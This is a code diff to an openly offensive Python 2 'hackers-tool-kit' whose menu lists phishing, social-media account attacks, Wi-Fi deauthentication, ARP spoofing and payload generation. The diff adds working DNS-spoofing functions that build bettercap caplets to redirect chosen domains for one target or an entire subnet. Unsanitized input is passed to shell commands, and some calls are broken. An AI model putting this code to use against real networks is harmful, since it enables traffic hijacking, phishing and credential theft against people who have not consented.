@@ -105,6 +105,7 @@ from threading import Thread, active_count
 os.system("clear")
 print "Starting hackers-tool-kit...  [ * ]-[63%]"
 import random
+import readline
 os.system("clear")
 print "Starting hackers-tool-kit...  [  *]-[67%]"
 import string
@@ -785,6 +786,7 @@ def help():
      ░  ░      ░     ░                 ░  ░  ░  ░░   ░   ░   ░                 ░ 
 \033[0m		            ░                                                             
 ?       :	displays this message
+reboot  :	reboot hackers-tool-kit
 update  :	update the hackers-tool-kit
 clear   :	clears screen
 banner  :	clears screen and shows new banner
@@ -868,6 +870,8 @@ foxhis  :	gather firefox history from privileged javascript shell
 rhawk   :	run the RED_HAWK script (info gathering tool)
 nano    :	open nano text editor
 compilec:	compile a c file
+dnsspoof:	dns spoofing  [type dnsspoofall to spoof entire subnet]
+htk-lite:	run a lighter version of hackers-tool-kit
 \033[91m---------------------------------------------------------------------------------\033[0m
 	"""
 #-----------------#
@@ -3037,196 +3041,257 @@ def compilec():
 #COMPILE C END#
 #-------------#
 
+#DNS SPOOF START#
+#---------------#
+def dnsspoof():
+	target = raw_input("\033[1mTarget:\033[0m ")
+	domain1 = raw_input("\033[1mDomain1:\033[0m ")
+	domain2 = raw_input("\033[1mDomain2:\033[0m ")
+	os.system('echo "net.sniff on\n" >> dns.cap')
+	os.system('echo "set dns.spoof.domains {0},{1}\n" >> dns.cap'.format(domain1,domain2))
+	os.system('echo "set dns.spoof.address {0}\n" >> dns.cap'.format(target))
+	os.system('echo "dns.spoof on\n" >> dns.cap')
+	print '\n\033[93mto stop type "exit"\033[0m'
+	os.system("sleep 2")
+	os.system("bettercap -no-history -caplet dns.cap")
+	os.system("rm dns.cap")
+
+def dnsspoofall():
+	domain1 = raw_input("\033[1mDomain1:\033[0m ")
+	domain2 = raw_input("\033[1mDomain2:\033[0m ")
+	os.system('echo "net.sniff on\n" >> dnsall.cap')
+	os.system('echo "set dns.spoof.domains {0},{1}\n" >> dnsall.cap'.format(domain1,domain2))
+	os.system('echo "set dns.spoof.all true\n" >> dnsall.cap')
+	os.system('echo "dns.spoof on\n" >> dnsall.cap')
+	print '\n\033[93mto stop type "exit"\033[0m'
+	os.system("sleep 2")
+	os.system("bettercap -no-history -caplet dnsall.cap")
+	os.system("rm dnsall.cap")
+
+
+#-------------#
+#DNS SPOOF END#
+
+
+#REBOOT HTK START#
+#----------#
+def reboot():
+	python = sys.executable
+	os.execl(python, python, * sys.argv)
+	curdir = os.getcwd()
+#--------------#
+#REBOOT HTK END#
+
+
 #THIS IS THE MAIN PART OF THE SCRIPT LIKE WHERE YOU TYPE WHERE IT RUNS THE COMMANDS SHIT LIKE THAT#
 #-------------------------------------------------------------------------------------------------#
 def main():
 	found = False
 	while not found:
-		x = raw_input(N+'\033[91m[\033[0mh-\033[94mT\033[0m-k\033[91m]\033[94m->\033[92m: \033[0m')
-		if x == "?":
-			help()
-		if x == "winload" :
-			winload()
-		if x == "clear" :
-			os.system("clear")
-		if x == "andload":
-			andload()
-		if x == "command":
-			c = raw_input("Command: ")
-			os.system(c)
-		if x == "msfcon" :
-			os.system("service postgresql start")
-			os.system("msfconsole")
-		if x == "set":
-			os.system("setoolkit")
-		if x == "msfven":
-			print R+"!ONLY TYPE THE ARGUMENTS DONT TYPE MSFVENOM\033[0m"
-			v = raw_input(G+"MSFVENOM: \033[0m")
-			os.system("msfvenom", v)
-		if x == "gmail" :
-			gmail()
-		if x == "insta":
-			insta()
-		if x == "fb" :
-			fb()
-		if x == "ipgrab":
-			ipgrab()
-		if x == "myip":
-			myip()
-		if x == "wifite":
-			wifite()
-		if x == "mon" :
-			mon()
-		if x == "netdev" :
-			netdev()
-		if x == "scannet":
-			scannet()
-		if x == "exit" :
-			import sys
-			print "follow \033[92m@tuf_unkn0wn\033[0m on instagram"
-			sys.exit()
-		if x == "rebootl":
-			print R+"! ARE YOU SURE YOU WANT TO REBOOT YOUR WHOLE DEVICE !\033[0m"
-			c = raw_input("[y/n]> ")
-			if c == "y" :
-				os.system("reboot")
-			if c == "n" :
+		try:
+			x = raw_input(N+'\033[91m[\033[0mh-\033[94mT\033[0m-k\033[91m]\033[94m->\033[92m: \033[0m')
+			if x == "?":
+				help()
+			if x == "winload" :
+				winload()
+			if x == "clear" :
 				os.system("clear")
-				mainbanner()
-				main()
-		if x == "port":
-			port()
-		if x == "info":
-			info()
-		if x == "sysinfo":
-			sysinfo()
-		if x == "msfex":
-			msfex()
-		if x == "udp":
-			udp()
-		if x == "tcp":
-			tcp()
-		if x == "syn":
-			syn()
-		if x == "msfpa":
-			msfpa()
-		if x == "msfau":
-			msfau()
-		if x == "ping" :
-			ping()
-		if x == "multih":
-			multih()
-		if x == "msfall":
-			msfall()
-		if x == "hydra" :
-			hydra()
-		if x == "cupp":
-			cupp()
-		if x == "vdir":
-			vdir()
-		if x == "monoff":
-			monoff()
-		if x == "vpn":
-			vpn()
-		if x == "vpnoff":
-			vpnoff()
-		if x == "slowl":
-			slowl()
-		if x == "pidox":
-			pidox()
-		if x == "specnet":
-			specnet()
-		if x == "pingen":
-			pingen()
-		if x == "reaver":
-			reaver()
-		if x == "deauth":
-			deauth()
-		if x == "macc":
-			macc()
-		if x == "macoff":
-			macoff()
-		if x == "arpspoof":
-			arpspoof()
-		if x == "sslscan":
-			sslscan()
-		if x == "payload":
-			payload()
-		if x == "crunch":
-			crunch()
-		if x == "traff":
-			traff()
-		if x == "resa":
-			resa()
-		if x == "resu":
-			resu()
-		if x == "hashid":
-			hashid()
-		if x == "restart":
-			restart()
-		if x == "medusa":
-			medusa()
-		if x == "wafwoof":
-			wafwoof()
-		if x == "cloud":
-			cloud()
-		if x == "brutex":
-			brutex()
-		if x == "methelp":
-			methelp()
-		if x == "winbyp":
-			winbyp()
-		if x == "exploit":
-			exploit()
-		if x == "phish":
-			phish()
-		if x == "datalist":
-			datalist()
-		if x == "msfev":
-			msfev()
-		if x == "upgrade":
-			upgrade()
-		if x == "nscript":
-			nscript()
-		if x == "sshver":
-			sshver()
-		if x == "chains":
-			chains()
-		if x == "mysqlv":
-			mysqlv()
-		if x == "connect":
-			connect()
-		if x == "terminal":
-			terminal()
-		if x == "aircrack":
-			aircrack()
-		if x == "source":
-			source()
-		if x == "dirscan":
-			dirscan()
-		if x == "aserver":
-			aserver()
-		if x == "clearall":
-			clearall()
-		if x == "run":
-			run()
-		if x == "banner":
-			banner()
-		if x == "phpload":
-			phpload()
-		if x == "pyload":
-			pyload()
-		if x == "foxhis":
-			foxhis()
-		if x == "rhawk":
-			rhawk()
-		if x == "nano":
-			nano()
-		if x == "update":
-			update()
-		if x == "compilec":
-			compilec()
+			if x == "andload":
+				andload()
+			if x == "command":
+				c = raw_input("Command: ")
+				os.system(c)
+			if x == "msfcon" :
+				os.system("service postgresql start")
+				os.system("msfconsole")
+			if x == "set":
+				os.system("setoolkit")
+			if x == "msfven":
+				print R+"!ONLY TYPE THE ARGUMENTS DONT TYPE MSFVENOM\033[0m"
+				v = raw_input(G+"MSFVENOM: \033[0m")
+				os.system("msfvenom", v)
+			if x == "gmail" :
+				gmail()
+			if x == "insta":
+				insta()
+			if x == "fb" :
+				fb()
+			if x == "ipgrab":
+				ipgrab()
+			if x == "myip":
+				myip()
+			if x == "wifite":
+				wifite()
+			if x == "mon" :
+				mon()
+			if x == "netdev" :
+				netdev()
+			if x == "scannet":
+				scannet()
+			if x == "exit":
+				print "\nfollow @tuf_unkn0wn on instagram"
+				print "\nExiting..."
+				break
+				os.system("service tor stop")
+				os.system("service postgresql stop")
+				sys.exit()
+			if x == "rebootl":
+				print R+"! ARE YOU SURE YOU WANT TO REBOOT YOUR WHOLE DEVICE !\033[0m"
+				c = raw_input("[y/n]> ")
+				if c == "y" :
+					os.system("reboot")
+				if c == "n" :
+					os.system("clear")
+					mainbanner()
+					main()
+			if x == "port":
+				port()
+			if x == "info":
+				info()
+			if x == "sysinfo":
+				sysinfo()
+			if x == "msfex":
+				msfex()
+			if x == "udp":
+				udp()
+			if x == "tcp":
+				tcp()
+			if x == "syn":
+				syn()
+			if x == "msfpa":
+				msfpa()
+			if x == "msfau":
+				msfau()
+			if x == "ping" :
+				ping()
+			if x == "multih":
+				multih()
+			if x == "msfall":
+				msfall()
+			if x == "hydra" :
+				hydra()
+			if x == "cupp":
+				cupp()
+			if x == "vdir":
+				vdir()
+			if x == "monoff":
+				monoff()
+			if x == "vpn":
+				vpn()
+			if x == "vpnoff":
+				vpnoff()
+			if x == "slowl":
+				slowl()
+			if x == "pidox":
+				pidox()
+			if x == "specnet":
+				specnet()
+			if x == "pingen":
+				pingen()
+			if x == "reaver":
+				reaver()
+			if x == "deauth":
+				deauth()
+			if x == "macc":
+				macc()
+			if x == "macoff":
+				macoff()
+			if x == "arpspoof":
+				arpspoof()
+			if x == "sslscan":
+				sslscan()
+			if x == "payload":
+				payload()
+			if x == "crunch":
+				crunch()
+			if x == "traff":
+				traff()
+			if x == "resa":
+				resa()
+			if x == "resu":
+				resu()
+			if x == "hashid":
+				hashid()
+			if x == "restart":
+				restart()
+			if x == "medusa":
+				medusa()
+			if x == "wafwoof":
+				wafwoof()
+			if x == "cloud":
+				cloud()
+			if x == "brutex":
+				brutex()
+			if x == "methelp":
+				methelp()
+			if x == "winbyp":
+				winbyp()
+			if x == "exploit":
+				exploit()
+			if x == "phish":
+				phish()
+			if x == "datalist":
+				datalist()
+			if x == "msfev":
+				msfev()
+			if x == "upgrade":
+				upgrade()
+			if x == "nscript":
+				nscript()
+			if x == "sshver":
+				sshver()
+			if x == "chains":
+				chains()
+			if x == "mysqlv":
+				mysqlv()
+			if x == "connect":
+				connect()
+			if x == "terminal":
+				terminal()
+			if x == "aircrack":
+				aircrack()
+			if x == "source":
+				source()
+			if x == "dirscan":
+				dirscan()
+			if x == "aserver":
+				aserver()
+			if x == "clearall":
+				clearall()
+			if x == "run":
+				run()
+			if x == "banner":
+				banner()
+			if x == "phpload":
+				phpload()
+			if x == "pyload":
+				pyload()
+			if x == "foxhis":
+				foxhis()
+			if x == "rhawk":
+				rhawk()
+			if x == "nano":
+				nano()
+			if x == "update":
+				update()
+			if x == "compilec":
+				compilec()
+			if x == "dnsspoof":
+				dnsspoof()
+			if x == "dnsspoofall":
+				dnsspoofall()
+			if x == "htk-lite":
+				os.system("python /root/hackers-tool-kit/htk-lite/htkl.py")
+			if x == "reboot":
+				reboot()
+		except:
+			print "\nfollow @tuf_unkn0wn on instagram"
+			print "\nExiting..."
+			break
+			os.system("service tor stop")
+			os.system("service postgresql stop")
 	found = True
+
 mainbanner()
 main()
 #-------------------------------------------------------------------------------------------------#
